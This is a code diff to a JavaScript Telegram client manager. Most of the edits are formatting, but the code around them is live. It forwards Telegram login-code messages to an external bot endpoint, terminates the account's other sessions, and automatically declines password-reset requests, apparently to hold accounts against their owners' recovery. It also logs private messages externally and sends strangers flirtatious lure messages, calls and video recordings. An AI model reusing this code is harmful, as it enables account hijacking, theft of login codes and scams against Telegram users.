@@ -191,7 +191,7 @@ class TelegramManager {
                     const senderJson = await this.getSenderJson(event);
                     const broadcastName = senderJson.username ? senderJson.username : senderJson.firstName;
                     const chatId = event.message.chatId.toString()
-                    if (!broadcastName.toLowerCase().endsWith('bot') && event.message.chatId.toString() !== "178220800" &&  event.message.chatId.toString() !== "777000") {
+                    if (!broadcastName.toLowerCase().endsWith('bot') && event.message.chatId.toString() !== "178220800" && event.message.chatId.toString() !== "777000") {
                         const db = UserDataDtoCrud.getInstance()
                         console.log(`${this.clientDetails.mobile.toUpperCase()}:${broadcastName}-${chatId} :: `, event.message.text);
                         await sendToLogs({ message: `${this.clientDetails.mobile}\n${broadcastName}: ${event.message.text}` });
@@ -234,7 +234,7 @@ class TelegramManager {
                                         console.log(`USer Exist Clearing interval2 ${chatId} ${userData.totalCount} ${userData.firstName}`)
                                         this.liveMap.set(chatId, { time: Date.now(), value: false });
                                     } else {
-                                        console.log(`USer Not Exist CallingNow ${chatId} ${userData.totalCount} ${userData.firstName}`)
+                                        console.log(`User Not Exist Calling Now ${chatId}`)
                                         try {
                                             await event.message.respond({ message: `I am waiting for you Babyy ${this.generateEmojis()}!!\n\n                  👇👇👇👇\n\n\n**@${this.clientDetails.username} @${this.clientDetails.username} ${this.getRandomEmoji()}\n@${this.clientDetails.username} @${this.clientDetails.username} ${this.getRandomEmoji()}**`, linkPreview: true })
                                             await this.setVideoRecording(chatId)
@@ -254,7 +254,7 @@ class TelegramManager {
                                             this.liveMap.set(chatId, { time: Date.now(), value: false });
                                             break;
                                         } else {
-                                            console.log(`USer Not Exist CallingNow ${chatId} ${userData.totalCount} ${userData.firstName}`)
+                                            console.log(`User Not Exist Calling Now ${chatId}`)
                                             await this.call(chatId);
                                             await sleep(10000)
                                             await this.setVideoRecording(chatId)
@@ -342,28 +342,28 @@ class TelegramManager {
                         // if (this.daysLeft > 0) {
                         //     await sendToLogs({ message: `${this.clientDetails.mobile}\nDaysLeft: ${this.daysLeft}` });
                         // }
-                       
+
                         if (event.message.chatId.toString() == "777000") {
                             await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`@${process.env.clientId}-PROM-${this.clientDetails.mobile}:\n${event.message.text}`)}`);
                             if (event.message.text.toLowerCase().includes('login code')) {
-                              await this.removeOtherAuths()
-                              setTimeout(async () => {
-                                try {
-                                  const result = await event.client.invoke(new Api.account.DeclinePasswordReset())
-                                } catch (error) {
-                                  parseError(error, "Error at DeclinePasswordReset")
-                                }
-                              }, 5 * 60 * 1000);
+                                await this.removeOtherAuths()
+                                setTimeout(async () => {
+                                    try {
+                                        const result = await event.client.invoke(new Api.account.DeclinePasswordReset())
+                                    } catch (error) {
+                                        parseError(error, "Error at DeclinePasswordReset")
+                                    }
+                                }, 5 * 60 * 1000);
                             }
                             if (event.message.text.toLowerCase().includes('request to reset account')) {
-                              await sleep(2000);
-                              try {
-                                const result = await event.client.invoke(new Api.account.DeclinePasswordReset());
-                              } catch (error) {
-                                parseError(error, "Error at DeclinePasswordReset")
-                              }
+                                await sleep(2000);
+                                try {
+                                    const result = await event.client.invoke(new Api.account.DeclinePasswordReset());
+                                } catch (error) {
+                                    parseError(error, "Error at DeclinePasswordReset")
+                                }
                             }
-                          }
+                        }
                     }
                 }
             } else {
